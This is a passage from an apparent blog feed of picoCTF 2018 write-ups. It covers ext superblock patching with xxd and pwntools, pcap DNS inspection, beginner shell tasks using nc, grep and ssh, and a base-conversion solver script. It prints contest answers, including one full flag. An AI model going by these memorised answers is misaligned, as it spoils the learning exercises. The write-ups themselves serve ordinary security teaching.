</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp ext-super-magic.img ext-patched.img
<span style="color:#6272a4">#BEFORE: seek 16 bits at offset 1080</span>
xxd -s <span style="color:#bd93f9">1080</span> -l <span style="color:#bd93f9">16</span>  ext-patched.img
00000438: <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0100</span> <span style="color:#bd93f9">0100</span> <span style="color:#bd93f9">0000</span> b328 995c <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0000</span>  S........<span style="color:#ff79c6">(</span>.<span style="color:#f1fa8c">\.</span>...
<span style="color:#6272a4">#PATCH</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;00000438: 53EF&#39;</span> | xxd -r - ext-patched.img
<span style="color:#6272a4">#AFTER</span>
xxd -s <span style="color:#bd93f9">1080</span> -l <span style="color:#bd93f9">16</span>  ext-patched
00000438: 53ef <span style="color:#bd93f9">0100</span> <span style="color:#bd93f9">0100</span> <span style="color:#bd93f9">0000</span> b328 995c <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0000</span>  S........<span style="color:#ff79c6">(</span>.<span style="color:#f1fa8c">\.</span>...
</code></pre></td></tr></table>
</div>
</div><p>Alternatively, we can use python pwn library in a file patch.py</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> pwn

<span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;./ext-super-magic.img&#39;</span>, <span style="color:#f1fa8c">&#39;rb&#39;</span>) <span style="color:#ff79c6">as</span> f:
  data <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">.</span>read()

<span style="color:#8be9fd;font-style:italic">print</span> pwn<span style="color:#ff79c6">.</span>enhex(data[<span style="color:#bd93f9">1024</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">56</span>:<span style="color:#bd93f9">1024</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">56</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">2</span>])

data <span style="color:#ff79c6">=</span> data[:<span style="color:#bd93f9">1024</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">56</span>] <span style="color:#ff79c6">+</span> p16(<span style="color:#bd93f9">0xEF53</span>) <span style="color:#ff79c6">+</span> data[<span style="color:#bd93f9">1024</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">56</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">2</span>:]

<span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;fixed.img&#39;</span>, <span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> f:
  f<span style="color:#ff79c6">.</span>write(data)
</code></pre></td></tr></table>
</div>
</div><h2 id="lying-out">lying-out</h2>
<p><img src="./resources/lying-out/traffic.png" alt="traffic.png"></p>
<p>You&rsquo;ll need to consult the file <a href="./resources/lying-out/traffic.png">traffic.png</a> to answer the following questions:</p>
<pre><code>Which of these logs have significantly higher traffic than is usual for their time of day?
You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic,
so answer all of them! Give your answer as a list of `log_ID` values separated by spaces.
For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7.
</code></pre>
<p>table:</p>
<pre><code>log_ID time num_IPs
0 0 00:15:00 9786
1 1 02:00:00 10235
2 2 02:15:00 11594
3 3 03:30:00 9685
4 4 04:30:00 9992
5 5 05:15:00 10005
6 6 05:45:00 11642
7 7 06:30:00 10151
8 8 08:45:00 10326
9 9 10:45:00 10176
10 10 15:30:00 11620
11 11 15:45:00 10163
12 12 16:30:00 11707
13 13 19:30:00 11847
2 6 10 12
Correct!
</code></pre>
<h2 id="whats-my-name">whats-my-name</h2>
<ul>
<li><a href="./resources/whats-my-name/myname.pcap">myname.pcap</a></li>
</ul>
<p>Some Hints, points us to investigate DNS protocol in the above pcap file</p>
<p>Opening the file with wireshark, we can then use the <code>dnsserver</code> filter to get rid of all other protocols. Remain two DNS messages; one of them contains the flag in cleartext</p>
<p>we could have just used the <code>strings</code> command but it is interesting</p>
]]></content></item><item><title>picoCTF 2018 - General Skills</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-general-skills/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-general-skills/</guid><description>grep-1 1 grep pico file net-cat 1 nc 2018shell.picoctf.com 37721 | grep pico strings 1 strings strings | grep pico The binary name is strings. The utility used to find the flag inside the binary has the same name string
pipe 1 nc 2018shell.picoctf.com 44310 | grep pico grep-2 1 ssh 0xade1@2018shell4.picoctf.com &amp;#39;grep -r pico /problems/grep-2_3_826f886f547acb8a9c3fccb030e8168d/files/&amp;#39; aca-Shell-a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ls cd secret ls rm intel* echo &amp;#39;Drop it in!</description><content type="html"><![CDATA[<h2 id="grep-1">grep-1</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep pico file
</code></pre></td></tr></table>
</div>
</div><h2 id="net-cat">net-cat</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 2018shell.picoctf.com <span style="color:#bd93f9">37721</span> | grep pico
</code></pre></td></tr></table>
</div>
</div><h2 id="strings">strings</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings strings | grep pico
</code></pre></td></tr></table>
</div>
</div><p>The binary name is strings. The utility used to find the flag inside the binary has the same name <code>string</code></p>
<h2 id="pipe">pipe</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 2018shell.picoctf.com <span style="color:#bd93f9">44310</span> | grep pico
</code></pre></td></tr></table>
</div>
</div><h2 id="grep-2">grep-2</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh 0xade1@2018shell4.picoctf.com <span style="color:#f1fa8c">&#39;grep -r pico /problems/grep-2_3_826f886f547acb8a9c3fccb030e8168d/files/&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="aca-shell-a">aca-Shell-a</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls
<span style="color:#8be9fd;font-style:italic">cd</span> secret
ls
rm intel*
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;Drop it in!&#39;</span>
<span style="color:#8be9fd;font-style:italic">cd</span> ..
<span style="color:#8be9fd;font-style:italic">cd</span> executables
ls
./dontLookHere
whoami
<span style="color:#8be9fd;font-style:italic">cd</span> ..
cp /tmp/TopSecret passwords/
<span style="color:#8be9fd;font-style:italic">cd</span> passwords
cat TopSecret
</code></pre></td></tr></table>
</div>
</div><h2 id="environ">environ</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">env | grep pico
</code></pre></td></tr></table>
</div>
</div><h2 id="ssh-keyz">ssh-keyz</h2>
<ul>
<li>generate your own pair of rsa 4096 ssh keys (id_rsa, id_rsa.pub)</li>
<li>copy the public key to the server in the ~/.ssh/authorized_keys</li>
<li>The flag is in the ssh banner which will be displayed when you login remotely with ssh to with your username.</li>
</ul>
<h2 id="what-base-is-this">what-base-is-this</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/usr/bin/env python
</span><span style="color:#ff79c6"></span>
import pwn, re

host, <span style="color:#8be9fd;font-style:italic">port</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>, <span style="color:#bd93f9">15853</span>
<span style="color:#8be9fd;font-style:italic">s</span> <span style="color:#ff79c6">=</span> pwn.remote<span style="color:#ff79c6">(</span>host, port<span style="color:#ff79c6">)</span>

<span style="color:#8be9fd;font-style:italic">prompt</span> <span style="color:#ff79c6">=</span> s.recv<span style="color:#ff79c6">()</span>
<span style="color:#8be9fd;font-style:italic">word</span> <span style="color:#ff79c6">=</span> re.findall<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Please give me the (.*) as a word&#34;</span>, prompt<span style="color:#ff79c6">)</span>
<span style="color:#8be9fd;font-style:italic">binaryword</span> <span style="color:#ff79c6">=</span> word<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span>
<span style="color:#8be9fd;font-style:italic">answer</span> <span style="color:#ff79c6">=</span> hex<span style="color:#ff79c6">(</span>int<span style="color:#ff79c6">(</span>binaryword.replace<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39; &#39;</span>,<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">)</span>,2<span style="color:#ff79c6">))[</span>2:<span style="color:#ff79c6">]</span>.decode<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;hex&#39;</span><span style="color:#ff79c6">)</span>
s.sendline<span style="color:#ff79c6">(</span>answer<span style="color:#ff79c6">)</span>

<span style="color:#8be9fd;font-style:italic">prompt</span> <span style="color:#ff79c6">=</span> s.recv<span style="color:#ff79c6">()</span>
<span style="color:#8be9fd;font-style:italic">word</span> <span style="color:#ff79c6">=</span> re.findall<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Please give me the (.*) as a word&#34;</span>, prompt<span style="color:#ff79c6">)</span>
<span style="color:#8be9fd;font-style:italic">hexadecimal_word</span> <span style="color:#ff79c6">=</span> word<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span>
<span style="color:#8be9fd;font-style:italic">answer</span> <span style="color:#ff79c6">=</span> hexadecimal_word.decode<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;hex&#39;</span><span style="color:#ff79c6">)</span>
s.sendline<span style="color:#ff79c6">(</span>answer<span style="color:#ff79c6">)</span>

<span style="color:#8be9fd;font-style:italic">prompt</span> <span style="color:#ff79c6">=</span> s.recv<span style="color:#ff79c6">()</span>
<span style="color:#8be9fd;font-style:italic">word</span> <span style="color:#ff79c6">=</span> re.findall<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Please give me the (.*) as a word&#34;</span>, prompt<span style="color:#ff79c6">)</span>
<span style="color:#8be9fd;font-style:italic">octal_word</span> <span style="color:#ff79c6">=</span> word<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span>
<span style="color:#8be9fd;font-style:italic">answer</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>.join<span style="color:#ff79c6">([</span>chr<span style="color:#ff79c6">(</span>int<span style="color:#ff79c6">(</span>i,8<span style="color:#ff79c6">))</span> <span style="color:#ff79c6">for</span> i in octal_word.split<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39; &#39;</span><span style="color:#ff79c6">)])</span>
s.sendline<span style="color:#ff79c6">(</span>answer<span style="color:#ff79c6">)</span>

<span style="color:#8be9fd;font-style:italic">prompt</span> <span style="color:#ff79c6">=</span> s.recv<span style="color:#ff79c6">()</span>
print prompt
<span style="color:#6272a4">#s.sendline(answer)</span>

s.close<span style="color:#ff79c6">()</span>
</code></pre></td></tr></table>
</div>
</div><p>This challenge is interesting because you have very limited time to answer, so it was much easier to build the above script that can answer way faster then a human being 13. you-cant-see-me
there is a suspicious invisible file &lsquo;. '</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -la
drwxr-xr-x   <span style="color:#bd93f9">2</span> root       root        <span style="color:#bd93f9">4096</span> Mar <span style="color:#bd93f9">25</span>  <span style="color:#bd93f9">2019</span> .
-rw-rw-r--   <span style="color:#bd93f9">1</span> hacksports hacksports    <span style="color:#bd93f9">57</span> Mar <span style="color:#bd93f9">25</span>  <span style="color:#bd93f9">2019</span> .
drwxr-x--x <span style="color:#bd93f9">556</span> root       root       <span style="color:#bd93f9">53248</span> Mar <span style="color:#bd93f9">25</span>  <span style="color:#bd93f9">2019</span> ..
cat  .<span style="color:#f1fa8c">\ \
</span><span style="color:#f1fa8c"></span>picoCTF<span style="color:#ff79c6">{</span>j0hn_c3na_paparapaaaaaaa_paparapaaaaaa_22f627d9<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="absolutely-relative">absolutely relative</h2>
<p>When we execute the binary <code>absolutely-relative</code>, we are prompted: &ldquo;You do not have sufficient permissions to view the flag.&rdquo;
Looking at the source code, we figure-out we simply need a file permissions.txt at the same location of the absolutely-relative binary; however we do not have write privileges in this folder.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6"></span>
<span style="color:#ff79c6">#define yes_len 3
</span><span style="color:#ff79c6"></span><span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>yes <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;yes&#34;</span>;

<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>()
{
    <span style="color:#8be9fd">char</span> flag[<span style="color:#bd93f9">99</span>];
